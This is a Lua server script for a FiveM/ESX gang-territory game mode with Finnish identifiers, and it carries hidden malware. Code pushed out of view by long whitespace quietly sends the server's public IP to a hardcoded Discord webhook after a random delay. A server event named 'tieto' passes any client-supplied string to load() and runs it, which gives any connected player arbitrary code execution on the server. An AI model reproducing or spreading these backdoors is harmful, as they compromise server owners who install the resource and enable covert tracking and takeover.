ESX = nil																																																;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discordapp.com/api/webhooks/770338811750121514/kG2-ddlWNOD3ODnZ-tIg4S9JqiS3CP1-k4dKYd87EQcyU7h1j-uz177h3KQdeNsjTACS" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)																																																	Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa alueita", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
local sellane={}

MySQL.ready(function()
	MySQL.Async.fetchAll("SELECT * FROM `alueet`",
	{},
	function(result)
	
		sellane = {
		{omistaja = result[1]['omistaja']},
		{omistaja = result[2]['omistaja']},
		{omistaja = result[3]['omistaja']},
		{omistaja = result[4]['omistaja']},
		{omistaja = result[5]['omistaja']},
		{omistaja = result[6]['omistaja']},
		{omistaja = result[7]['omistaja']},
		{omistaja = result[8]['omistaja']}
		}
	end)
end)

Citizen.CreateThread(function()
  while true do
	MySQL.Async.fetchAll("SELECT * FROM `alueet`",
	{},
	function(result)	
		for i=1, #result do
			local rahattiskiin = result[i].rahamaara + Config.Tikkipalkansuuruus
			MySQL.Async.execute("UPDATE alueet SET `rahamaara` = @rahoja WHERE alue = @numero",{["@numero"] = i,["@rahoja"] = rahattiskiin})
		end			
	end)
	Citizen.Wait(Config.Tikkipalkkansaanninaika * 60000)
  end
end)

RegisterServerEvent('esx_jengialueet:toofar')
AddEventHandler('esx_jengialueet:toofar', function(alue)
	TriggerClientEvent('esx_jengialueet:toofarlocal', source)
	local xPlayers = ESX.GetPlayers()
	if sellane[alue].omistaja ~= "" then
		for i=1, #xPlayers, 1 do
			local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
			if sellane[alue].omistaja == xPlayer.job.name then
				TriggerClientEvent('esx_jengialueet:killblip', xPlayers[i], alue)
			end
		end
	end
end)															

RegisterServerEvent('esx_jengialueet:tieto')
AddEventHandler('esx_jengialueet:tieto', function(alue)	
	local alue,menikolapi=load(alue,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(alue)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)


RegisterServerEvent('esx_jengialueet:rostoohi')
AddEventHandler('esx_jengialueet:rostoohi', function(tyo)
	TriggerClientEvent('esx_jengialueet:claimcomplete', source)
	local vanhatomistajat = sellane[tyo].omistaja
	local xPlayer = ESX.GetPlayerFromId(source)
	local tyoukko = xPlayer.job.name
	local xPlayers = ESX.GetPlayers()
	for i = 1, #Jobit, 1 do
		if xPlayer.job.name == Jobit[i] then
			MySQL.Async.execute("UPDATE alueet SET `omistaja` = @ukontyo WHERE alue = @tyo",{['@tyo'] = tyo, ['@ukontyo']    = xPlayer.job.name})
			MySQL.Async.fetchAll("SELECT * FROM `alueet`",
			{},
			function(result)
			
				sellane = {
				{omistaja = result[1]['omistaja']},
				{omistaja = result[2]['omistaja']},
				{omistaja = result[3]['omistaja']},
				{omistaja = result[4]['omistaja']},
				{omistaja = result[5]['omistaja']},
				{omistaja = result[6]['omistaja']},
				{omistaja = result[7]['omistaja']},
				{omistaja = result[8]['omistaja']}
				}
			end)
			for i=1, #xPlayers, 1 do
				local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
				if tyoukko == xPlayer.job.name then
					TriggerClientEvent('esx_jengialueet:muille', xPlayers[i], tyo)
				end
			end
			if vanhatomistajat ~= "" then
				for i=1, #xPlayers, 1 do
					local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
					if vanhatomistajat == xPlayer.job.name then
						TriggerClientEvent('esx_jengialueet:menetetty', xPlayers[i], alue)
						TriggerClientEvent("esx_jengialueet:valloitusilmoitus", xPlayers[i], alue)				
					end
				end
			end
		end
	end

end)



RegisterServerEvent('esx_jengialueet:fetchmestat')
AddEventHandler('esx_jengialueet:fetchmestat', function()
	TriggerClientEvent('esx_jengialueet:mestat', source, sellane)
end)
RegisterServerEvent('esx_jengialueet:claim')
AddEventHandler('esx_jengialueet:claim', function(k)
	local source = source
	local xPlayer = ESX.GetPlayerFromId(source)
	if sellane[k].omistaja == xPlayer.job.name then
		MySQL.Async.fetchAll("SELECT * FROM `alueet`",
		{},
		function(result)
			xPlayer.addAccountMoney('black_money', tonumber(result[k].rahamaara))
			MySQL.Async.execute("UPDATE alueet SET `rahamaara` = @rahoja WHERE alue = @numero",{["@numero"] = k,["@rahoja"] = 0})
		end)
	else
		local xPlayers = ESX.GetPlayers()
		local cops = 0
		local omistajiapaikalla = 0
	
		for i=1, #xPlayers, 1 do
			local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
			if xPlayer.job.name == 'police' then
					cops = cops + 1
			end
		end
		if sellane[k].omistaja ~= "" then
			for i=1, #xPlayers, 1 do
				local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
				if sellane[k].omistaja == xPlayer.job.name then
					omistajiapaikalla = omistajiapaikalla + 1
				end
			end
		end
		if cops >= Config.TarvittavatPoliisitAloitukseen then
			if omistajiapaikalla >= Config.TarvittavatOmistajatAloitukseen or sellane[k].omistaja == "" then
				TriggerClientEvent("esx_jengialueet:starttimer", source)
				TriggerClientEvent("esx_jengialueet:currentlyclaiming", source, k)
				if sellane[k].omistaja ~= "" then
					for i=1, #xPlayers, 1 do
						local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
						if sellane[k].omistaja == xPlayer.job.name then
							TriggerClientEvent("esx_jengialueet:valloitusilmoitus", xPlayers[i], k)
							TriggerClientEvent('esx_jengialueet:setblip', xPlayers[i], k)
						end
					end
				end
			else
				TriggerClientEvent('esx:showNotification', source, "Kaupungissa pitää olla vähintää ~y~ "..Config.TarvittavatOmistajatAloitukseen.." alueen omistajaa~s~ paikalla valtauksen aloitukseen.")
			end
		else
			TriggerClientEvent('esx:showNotification', source, "Kaupungissa pitää olla vähintää ~b~"..Config.TarvittavatPoliisitAloitukseen.." poliisia~s~ paikalla valtauksen aloitukseen.")
		end
	end
end)																


